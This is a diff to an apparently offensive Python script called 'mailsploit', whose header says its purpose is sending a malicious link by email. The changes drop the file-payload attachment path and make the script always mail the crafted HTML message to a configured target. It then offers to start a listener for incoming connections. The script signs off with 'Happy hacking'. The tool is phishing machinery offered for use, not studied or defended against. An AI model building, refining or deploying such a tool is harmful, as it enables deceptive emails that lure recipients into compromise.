@@ -1,7 +1,7 @@
 #!/usr/bin/python
 #############################################################
 #
-# Title: mailsploit
+# Title: mailsploit.py
 # Author: Th3J0k3r
 #
 # Purpose: to be able to send a malicious link via email
@@ -54,11 +54,7 @@ def setup ():
 	global password
 	global target
 	global subject
-	global payload
 	global debuglevel
-	global message
-	global emaillist
-	global massmailer
 	global message
 
 	configParser = ConfigParser.RawConfigParser()	
@@ -68,12 +64,11 @@ def setup ():
 	password = configParser.get('Config', 'password')
 	target = configParser.get('Config', 'target')
 	subject = configParser.get('Config', 'subject')
-	payload = configParser.get('Config', 'payload')
 	debuglevel = configParser.get('Config', 'debuglevel')
 	message = configParser.get('Config', 'message')
 
 	# Validate the input.
-	if (email == 'None' and password == 'None' and target == 'None' and targetName == 'None'):
+	if (email == 'None' or password == 'None' or target == 'None' or targetName == 'None'):
 		color_print('[!] Please setup your config file.', color='red')	
 		return
 
@@ -172,35 +167,24 @@ def sendMail (server):
 		"""
 	html = MIMEText(text, 'html')
 	msg.attach(html)
-			
-	if os.path.isfile(payload):
+	
+	color_print("[*] Sending malicious link..", color='yellow')
+	time.sleep(1)
+	server.sendmail(email, target, msg.as_string())
 
-		# Attach the file.
-		#fileMsg = MIMEBase('application','octet-stream')
-		#fileMsg.set_payload(file(payload_new).read())
-		#encoders.encode_base64(fileMsg)
-		#fileMsg.add_header('Content-Disposition','attachment;filename= %s' % filename)
-		#msg.attach(fileMsg)
+	# Do you want to listen for any connections.
+	listen = raw_input('Do you want to start up a listener: [Y/N]: ')
+	if listen == 'Y' or listen == 'y' or listen == 'yes' or listen == 'Yes':	
+		color_print("[+] Starting a listener", color='blue')
 
-		# Send the payload
-		#color_print("[*] Sending malicious payload..", color='yellow')
-		server.sendmail(email, target, msg.as_string())
-
-				# Do you want to listen for any connections.
-		listen = raw_input('Do you want to start up a listener: [Y/N]: ')
-		if listen == 'Y' or listen == 'y' or listen == 'yes' or listen == 'Yes':	
-			color_print("[+] Starting a listener", color='blue')
-
-			server.quit()
-			# Listen for a connection
-			listenForConnections()
-		else:
-			server.quit()
-			color_print("Thanks, Happy hacking", color='blue')
-			return	
-		color_print("\n[*] Email sent", color='green')
+		server.quit()
+		# Listen for a connection
+		listenForConnections()
 	else:
-		color_print("[!] Please put your payload in " + payload + " For it to work!!", color='red')	
+		server.quit()
+		color_print("Thanks, Happy hacking", color='blue')
+		return	
+	color_print("\n[*] Email sent", color='green')
 
 #
 # Listen for a connection
